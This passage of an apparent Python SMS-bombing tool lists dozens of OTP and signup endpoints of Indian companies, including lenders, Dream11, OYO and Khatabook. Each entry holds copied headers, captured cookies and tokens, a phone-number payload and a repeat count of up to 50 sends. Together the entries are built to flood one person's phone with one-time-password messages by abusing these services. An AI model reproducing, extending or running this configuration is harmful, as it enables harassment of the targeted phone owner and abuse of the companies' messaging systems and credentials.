            "Cookie": "shell#lang=en; ASP.NET_SessionId=nyoubocr2b4vz3iv2ahat3xs; ARRAffinity=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; ARRAffinitySameSite=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; _gcl_aw=GCL.1728839037.EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE; _gcl_gs=2.1.k1$i1728839026$u150997757; _gcl_au=1.1.486755895.1728839037; _ga=GA1.1.694452391.1728839040; sts=eyJzaWQiOjE3Mjg4MzkwNDA3MjgsInR4IjoxNzI4ODM5MDQwNzI4LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnVkeW9ncGx1cy5hZGl0eWFiaXJsYWNhcGl0YWwuY29tJTJGc2lnbnVwLWNvYnJhbmRlZCUzRnVybCUzRCUyRiUyNnV0bV9zb3VyY2UlM0REZW50c3Vnb29nbGUlMjZ1dG1fY2FtcGFpZ24lM0R0cmF2ZWxfcG1heCUyNnV0bV9tZWRpdW0lM0QlMjZ1dG1fY29udGVudCUzRGtscmFodWwlMjZqb3VybmV5JTNEcGwlMjZnYWRfc291cmNlJTNEMSUyNmdjbGlkJTNERUFJYUlRb2JDaE1Jclk2bDh1bUxpUU1WNUtobUFoMVRhQTBvRUFNWUFTQUFFZ0o0cGZEX0J3RSIsInBldCI6MTcyODgzOTA0MDcyOCwic2V0IjoxNzI4ODM5MDQwNzI4fQ==; stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5YTdmMGYyZC01NDJjLTRiNTEtYWEwNC01NzAwMjRlN2M4YjAifQ==; stgeo=IjAi; stbpnenable=MA==; __stdf=MA==; _ga_4CYZ07WNGN=GS1.1.1728839040.1.0.1728839049.51.0.0",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded?url=/&utm_source=Dentsugoogle&utm_campaign=travel_pmax&utm_medium=&utm_content=klrahul&journey=pl&gad_source=1&gclid=EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"MobileNumber={phone}&functionality=signup",
        "count": 1
    },
    
    {
        "url": "https://www.muthootfinance.com/smsapi.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; _gcl_au=1.1.289346829.1728838221; _ga_S5CNT4BSQC=GS1.1.1728838222.1.0.1728838222.60.0.0; _ga=GA1.2.273797446.1728838222; _gid=GA1.2.1628453949.1728838223; _gat_UA-38238796-1=1; _fbp=fb.1.1728838224699.885355239931807707; toasterClosedOnce=true",
            "origin": "https://www.muthootfinance.com",
            "priority": "u=1, i",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3",
        "count": 3
    },
    
    {
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "cookie": "_ga=GA1.2.1154421870.1728838134; _gid=GA1.2.883266871.1728838135; _gat_UA-96384581-2=1; WZRK_G=1acba64bbe41434abc9c3d3d5645deeb; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1728838134%2C%22t%22%3A1728838134%7D; _uetsid=0982d4e0898311ef9e26c943f5765261; _uetvid=09833b40898311efb6d4f32471c8cf05; _ga_4S93MBNNX8=GS1.2.1728838135.1.0.1728838140.55.0.0; _ga_F7R96SWGCB=GS1.1.1728838134.1.1.1728838140.0.0.0",
            "origin": "https://www.gopaysense.com",
            "priority": "u=1, i",
            "referer": "https://www.gopaysense.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
    
    {
        "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "gclid=undefined; AKA_A2=A",
            "origin": "https://www.iifl.com",
            "priority": "u=1, i",
            "referer": "https://www.iifl.com/personal-loans",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&utm_source=&utm_medium=&utm_campaign=&utm_content=&utm_term=&campaign=&gclid=&lead_id=&redirect_url=&form_build_id=form-FvvMqggkrdM-07pMIIyAElAcaj_kGjCMOS5UHKh_vUc&form_id=webform_submission_muti_step_lead_gen_form_node_66_add_form&_triggering_element_name=op&_triggering_element_value=Apply+Now&_drupal_ajax=1&ajax_page_state%5Btheme%5D=iifl_finance&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=bootstrap_barrio%2Fglobal-styling%2Cclientside_validation_jquery%2Fcv.jquery.ckeditor%2Cclientside_validation_jquery%2Fcv.jquery.ife%2Cclientside_validation_jquery%2Fcv.jquery.validate%2Cclientside_validation_jquery%2Fcv.pattern.method%2Ccore%2Fdrupal.autocomplete%2Ccore%2Fdrupal.collapse%2Ccore%2Fdrupal.states%2Ccore%2Finternal.jquery.form%2Ceu_cookie_compliance%2Feu_cookie_compliance_default%2Ciifl_crm_api%2Fglobal-styling%2Ciifl_crm_api%2Fgold-global-styling%2Ciifl_finance%2Fbootstrap%2Ciifl_finance%2Fbreadcrumb%2Ciifl_finance%2Fdailyhunt-pixel%2Ciifl_finance%2Fdatalayer%2Ciifl_finance%2Fglobal-styling%2Ciifl_finance%2Fpersonal-loan%2Ciifl_finance_common%2Fglobal%2Cnode_like_dislike_field%2Fnode_like_dislike_field%2Cparagraphs%2Fdrupal.paragraphs.unpublished%2Csearch_autocomplete%2Ftheme.minimal.css%2Csystem%2Fbase%2Cviews%2Fviews.module%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.composite%2Cwebform%2Fwebform.dialog%2Cwebform%2Fwebform.element.details%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.options%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form",
        "count": 5
    },
    
    {
        "url": "https://v2-api.bankopen.co/users/register/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "baggage": "sentry-environment=prod,sentry-release=app-open-money%405.2.0,sentry-public_key=76093829eb3048de9926891ff8e44fac,sentry-trace_id=a17bb4c75de741ffa0998329abf41310",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "priority": "u=1, i",
            "referer": "https://app.opencapital.co.in/en/onboarding/register?utm_source=google&utm_medium=cpc&utm_campaign=IYD_MaxTesting&utm_term=&utm_placement=&gad_source=1&gclid=EAIaIQobChMIo_vwi96LiQMVQaVmAh27cAhXEAAYAiAAEgIkAPD_BwE",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sentry-trace": "a17bb4c75de741ffa0998329abf41310-bc065941fd22d33d-1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-api-version": "3.1",
            "x-client-type": "Web"
        },
        "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1}),
        "count": 5
    },
    
    {
        "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "priority": "u=0, i",
            "referer": "https://www.tatacapital.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({
            "header": {
                "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                "identifier": "nli"
            },
            "body": {
                "mobileNumber": phone
            }
        }),
        "count": 40
    },
    
    {
        "url": "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "client_remote_address": "10.0.2.16",
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.11.0"
        },
        "data": lambda phone: json.dumps({"mobile": f"+91{phone}"}),
        "count": 3
    },
    
    {
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {
            "x-kb-app-name": "khatabook",
            "x-kb-app-version": "801800",
            "x-kb-app-locale": "en",
            "x-kb-platform": "android",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.10.0"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "app_signature": "wk+avHrHZf2"}),
        "count": 20
    },
    
    {
        "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "priority": "u=1, i",
            "referer": "https://www.orangehealth.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True}),
        "count": 3
    },
    
    {
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "priority": "u=1, i",
            "referer": "https://www.jobhai.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-transaction-id": "JS-WEB-89b40679-56c2-4c0e-926e-0fafca8a84f3"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
    
    {
        "url": "https://mconnect.isteer.co/mconnect/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app_platform": "mvaahna",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "priority": "u=1, i",
            "referer": "https://mvaahna.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}),
        "count": 50
    },
    
    {
        "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1719472121119",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": "_gid=GA1.2.1239008246.1719472125; _gat_gtag_UA_245702_1=1; _ga=GA1.1.1226959669.1719472122; _ga_1C0W65RV19=GS1.1.1719472121.1.1.1719472138.0.0.0; _ga_0VL2HF4X5B=GS1.1.1719472125.1.1.1719472138.47.0.0",
            "referer": "https://www.astrosage.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "script",
            "sec-fetch-mode": "no-cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 3
    },
    
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "varnishPrefixHome=false; utm_source=SPD-Search-Top8-National-Brand-EM-Home; utm_medium=gads_c_search; platform=web; _gcl_gs=2.1.k1$i1719310791; _gcl_au=1.1.1890033919.1719310798; _gcl_aw=GCL.1719310800.EAIaIQobChMI5dC558P2hgMVUhaDAx2-3AwcEAAYASAAEgJXUvD_BwE; _ga=GA1.1.1822449614.1719310800; _fbp=fb.1.1719310801079.320900520174536436; _ga_WQREN8TJ7R=GS1.1.1719310799.1.1.1719310837.22.0.0",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://www.spinny.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA4vFfvSahNObwINE1dnN-C8rahsbSbuh4fqeqcBJ82qWMuwus56lEKOYaUxj8u0opIAA7co7oDhBaTuIHM-Do3wgKmbo68rCKnvtFpPHiKiEpmKQhPcjvAT_6_y-2iyj_DR80S5npM-jXnNMoFS92SJQYvjGBbWFD9lFiFEgbnAWMBxUwNVyacx1gVszD7HvqC_nLDISnnqi7iWBjoYDJgTUg5iqds1DA-KYxbtEDtcpKgBi6Em34U4GG1ggZoKijC-k8qy1lInhWqo-xK6EY6acXydcGHKgXzWrsdHG2aciibuozN-3ZAWNfN0GsFfU4L1os4pe4ruCW1rEAuDJ3HT5ojiD5iiUUg4OBcJkUHCu2LSTBrTacO8PHH4PT5ruV-rvZyNVvAuX5xDcJea1NBUYyMitVtK0Lf1M75e3k3XL6K1MTq3QDDPXJlrStTSrB6qZ-m3n9Tf6sCnDZ0jcRoMtHU414MzHym3Itswbj5YuJM8wcn5aAnvvBv7UGskct4Jz4ZyJdcC5cS8AzYNSmyAS3JawN644RVl59KaNGsuYt9Ls7o2UtWhkIwlIsIBukVZW35yTaGNUhEWaRrDD-3BfUwKtloJItM2En2_nuI3f71HfTVI-I0dY6kTrMRuYfCGaz67jZiekSSIuOxenxVxp1BcG6rEO-zx-fRM_gMyDuiKGTmq98l-lPIfhSUFRXtloNr_qcKp1m6_jpzrfIi8M6UhiCYcnQCmNv19MAA8BWnEiyPPI_-FGh12jp22OCGA0mcoqGNadE6w-IezHN8fi6aWBAPRgEYf42XPv5oWiVa0ykvHg0MZKChb7n3Avk_ADibr632go3SVIIfXrFUgbWsUDLocd1WBkpeaUyKlKSqisbjKqHpxFMMaJGcjapUDstT1EMFINhNUCgowcKTY5zGMm9W9R9N48Ouxgyin2c7_0LmS5wPj3onP9yOJ8E6GL3aMKhtcxn4lXfxymyB1VFMzMMD-sAfkVoMliWhsludZWTOhuSXUE75SYxfDjrOQTlu6oRrda8QbMpR7Hv2qK2NjnrlNx4Qq2wSR0w56-Qtlif5gfFrD0U_TI7OH-yVcj45v_p0jGdoJ2Zh_6oFip5fSnSgdzXhSoGAKEVbm6NGrIGYiWLj6o-fnZrzpfRvqaS9NedG3qjr0p94lVFSeiW0s0BK0KpDWlwY4C7nbeqLkjk55tabY9B_nZjN7IXmJKNv46tZqMJVZJW37z7xV9aBQ17VARz8_UgluqS97i-NwsLuwWMZpCNpJeYGRVIKFSJtN1l3LutO1USLkYU9Or9fPEPPSOpG0fDbaFnK2QVruku8XnhvEYGHHEM0mFGcJK1-Eds95wA1c3P0Hr6DLfW7k3JKjQx_hJm719-w-UwsOYqZccz1Sh00-dmGlSJsrgOljgPOD8ZVca4Xso92P-W3NxnNEZLO45IjzTIkB1ItKYEDG7V1b4ixqw36J_lkPt7ekLvFMhcvNZkyIWTpI42Ag7ALnn6P3SfWAZwkrGXry6LPikOJz1zB5FdzEtUuF9_EO-YjzBRr1pv9ZmbSbdT2MOJv3rQ40GREvbIIfd_BA_zSyPl7HSe8QMlBksjHapVfBE_jNtcakDVSWdE6CBZjPksgIUIv6yzC0LWZA1h6v4mX-K85hmIb01UnPtnTMD_7o4K79JzYgk4gFLBxjTZVyKvBhFpVhCcq7ePBWiO8LPDbaF6R7uSF8ZgrRunZbrEMrnLBqx6EKrdtJGgN2q8VFCDjNeQJH3CuYuOISzE_rPfc", "expected_action": "login"}),
        "count": 3
    },
    
    {
        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "dh_user_id=17cf6211-32d3-11ef-b821-53f25fac4eef; _scid=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _scid_r=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _fbp=fb.1.1719310489582.789493345356902452; _sctr=1%7C1719298800000; __csrf=6rcny4; _dd_s=rum=2&id=e35a5e56-45d2-4dbf-8678-20bc45cbb11c&created=1719310504672&expire=1719311451078",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "priority": "u=1, i",
            "referer": "https://www.dream11.com/register?redirectTo=%2F",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-device-identifier": "macos"
        },
        "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"}),
        "count": 1
    },
    
    {
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Cookie": "bp=lg; vxid=3a5a7d25605926fc8a9f938b4198d7f3; referral=https%253A%252F%252Fwww.google.com%252F; _ga=GA1.1.100588395.1719309875; WZRK_G=4e632d8f31c540b3aaf6c01c140a7e0e; _fbp=fb.1.1719309877848.406176085245910420; WZRK_S_4RW-KZK-995Z=%7B%22p%22%3A1%2C%22s%22%3A1719309880%2C%22t%22%3A1719309879%7D; _ga_45DD1K708L=GS1.1.1719309875.1.0.1719309885.0.0.0",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "language": "en",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "use-applinks": "true",
            "x-app-name": "WEB",
            "x-requested-with": "WEB"
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 5
    },
    
    {
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://bellavitaorganic.com",
            "priority": "u=1, i",
            "referer": "https://bellavitaorganic.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 10
    },
    
    {
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "text/plain;charset=UTF-8",
            "cookie": "_csrf=0L9ShP2N7kBoNgROXcXgrpzO; acc=IN; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DMH%2Ccity%3DMUMBAI%2Clat%3D18.98%2Clong%3D72.83%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D55836%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; mab=f14b44638c4c98b516a82db98baa1d6d; expd=mww2%3A1%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A1%7Cgmbr%3A1%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A1%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Clog2%3A0%7Clog2%3A0%7Cugce%3A0%7Cltvr%3A1%7Chwiz%3A0%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A0%7Cprwt%3A0%7Ccbhd%3A0%7Cins2%3A3%7Cmhdc%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Csovb%3A1%7Cqupi%3A0%7Cnbi1%3A3; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE%3D; _uid=Not%20logged%20in; XSRF-TOKEN=OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM; fingerprint2=8f2b46724e08bf3602b6c5f6745f8301; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.185019609.1719309292; _gid=GA1.2.1636583452.1719309292; _gcl_au=1.1.1556474320.1719309295; tvc_utm_source=google; tvc_utm_medium=organic; tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); rsd=true; _gat=1; _ga_589V9TZFMV=GS1.1.1719309291.1.1.1719309411.8.0.1086743157",
            "deviceid": "8f2b46724e08bf3602b6c5f6745f8301411649",
            "externalheaders": "[object Object]",
            "loc": "153",
            "origin": "https://www.oyorooms.com",
            "priority": "u=1, i",
            "referer": "https://www.oyorooms.com/login?country=&retUrl=/search%3Flocation%3DGonda%252C%2520Uttar%2520Pradesh%252C%2520India%26latitude%3D27.0374187%26longitude%3D81.95348149999995%26searchType%3Dlocality%26coupon%3D%26checkin%3D25%252F06%252F2024%26checkout%3D26%252F06%252F2024%26roomConfig%255B%255D%3D1%26showSearchElements%3Dfalse%26country%3Dindia%26guests%3D1%26rooms%3D1",
            "sdata": "eyJrdWQiOlsxODc0MDAsNTA3MDAsOTA3MDAsODMzMDAsNTkxMDAsNjg4MDAsMTE4MDAwLDg2NDAwLDExOTgwMCwxMjg2MDAsMTE0NDAwLDE5NTAwMCw4MTUwMCwxMTE4MDAsMTU5MzAwLDE0MjYwMCwxNDA5MDAsNzI1NDQ3MDAsNzI3Njg4MDAsNzMwMDgxMDAsNzMxOTI1MDAsNzMzODQzMDAsNzM2MDAxMDAsNzM4MDg1MDAsNzM5Njg0MDAsNzQxNzY3MDAsNzQ0MzIzMDAsNzkwMjQ0MDAsMjAwMDAwLDExOTkwMCw0Nzk5MDAsODE1OTAwLDEwMjQwMDAsMTQzOTcwMCwyMTk5NzAwLDI1NzU3MDAsMTE0NDAwLDI1NjIzMDAsMzUyMjEwMCwxODM3MDAsMTc1NTAwLDE1OTEwMCwxOTg5MDAsMTUxNzAwLDE1MTkwMCwxNTkyMDAsMTE5NzAwLDExOTMwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6W10sInRpZCI6W10sImtpZCI6Wzk5MTMxMDAsNDEyODAwLDE4MDMwMCwxNzM4MDAsODA0MDAsMTA3OTAwLDcyNzUyMDAsNzE4MDAsMTc2MDAwLDIzMjMwMCwxNjMwMCw2MzMwMDAsMjc1MDYwMCwxODQ1MDAsMjI0NzAwLDI1MDEwMCwyMzMwMCw4MDAzMDAsMjMyMjAwLDMwMzc3MDAsMTYwMDUwMCw2NDcwMCw4MDAsMjMyNDAwLDMwNDgwMCw0ODMwMCw0ODcwMCwzMjQwMCw1NTI2MDBdLCJ0bXYiOltdfQ==",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
